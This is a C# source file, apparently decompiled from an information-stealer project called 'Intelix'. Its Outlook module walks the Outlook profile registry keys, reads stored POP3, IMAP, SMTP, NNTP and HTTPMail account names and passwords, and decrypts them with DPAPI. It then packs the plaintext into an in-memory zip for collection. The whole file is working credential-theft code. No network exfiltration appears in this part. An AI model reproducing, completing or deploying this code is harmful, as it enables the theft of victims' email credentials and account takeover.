using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using Microsoft.Win32;

namespace Intelix.Targets.Messangers;

public class Outlook : ITarget
{
	private static readonly Regex MailAddressRx = new Regex("^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$", RegexOptions.Compiled);

	private static readonly Regex HostnameRx = new Regex("^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$", RegexOptions.Compiled);

	private static readonly string[] RegistryRoots = new string[4] { "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676", "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676", "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676", "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676" };

	private static readonly string[] KeysToCheck = new string[28]
	{
		"SMTP Email Address", "SMTP Server", "POP3 Server", "POP3 User Name", "SMTP User Name", "NNTP Email Address", "NNTP User Name", "NNTP Server", "IMAP Server", "IMAP User Name",
		"Email", "HTTP User", "HTTP Server URL", "POP3 User", "IMAP User", "HTTPMail User Name", "HTTPMail Server", "SMTP User", "POP3 Password2", "IMAP Password2",
		"NNTP Password2", "HTTPMail Password2", "SMTP Password2", "POP3 Password", "IMAP Password", "NNTP Password", "HTTPMail Password", "SMTP Password"
	};

	public void Collect(InMemoryZip zip, Counter counter)
	{
		StringBuilder stringBuilder = new StringBuilder();
		string[] registryRoots = RegistryRoots;
		foreach (string rootPath in registryRoots)
		{
			stringBuilder.Append(ReadRegistryTree(rootPath));
		}
		if (stringBuilder.Length != 0)
		{
			string text = Path.Combine("Outlook", "Outlook.txt");
			zip.AddTextFile(text, stringBuilder.ToString());
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Outlook";
			registryRoots = RegistryRoots;
			foreach (string text2 in registryRoots)
			{
				counterApplications.Files.Add(text2 + " => " + text);
			}
			counterApplications.Files.Add(text);
			counter.Applications.Add(counterApplications);
		}
	}

	private string ReadRegistryTree(string rootPath)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Stack<string> stack = new Stack<string>();
		stack.Push(rootPath);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text, writable: false);
			if (registryKey == null)
			{
				continue;
			}
			string[] keysToCheck = KeysToCheck;
			foreach (string text2 in keysToCheck)
			{
				object value = registryKey.GetValue(text2);
				if (value != null)
				{
					string value2 = FormatValue(text2, value);
					if (!string.IsNullOrEmpty(value2))
					{
						stringBuilder.AppendLine(value2);
					}
				}
			}
			keysToCheck = registryKey.GetSubKeyNames();
			foreach (string path in keysToCheck)
			{
				try
				{
					stack.Push(Path.Combine(text, path));
				}
				catch
				{
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			stringBuilder.AppendLine();
		}
		return stringBuilder.ToString();
	}

	private string FormatValue(string valueName, object raw)
	{
		if (raw is byte[] array)
		{
			string text = DecryptValue(array);
			if (!string.IsNullOrEmpty(text))
			{
				return valueName + ": " + text;
			}
			try
			{
				string text2 = Encoding.UTF8.GetString(array).Replace("\0", "");
				if (!string.IsNullOrWhiteSpace(text2))
				{
					return valueName + ": " + text2;
				}
			}
			catch
			{
			}
			return null;
		}
		string text3 = raw.ToString();
		if (string.IsNullOrWhiteSpace(text3))
		{
			return null;
		}
		if (!HostnameRx.IsMatch(text3))
		{
			MailAddressRx.IsMatch(text3);
		}
		return valueName + ": " + text3;
	}

	private static string DecryptValue(byte[] encrypted)
	{
		if (encrypted == null || encrypted.Length <= 1)
		{
			return null;
		}
		try
		{
			byte[] array = new byte[encrypted.Length - 1];
			Buffer.BlockCopy(encrypted, 1, array, 0, array.Length);
			byte[] array2 = DpApi.Decrypt(array);
			if (array2 == null || array2.Length == 0)
			{
				return null;
			}
			return Encoding.UTF8.GetString(array2).TrimEnd(default(char));
		}
		catch
		{
			return null;
		}
	}
}
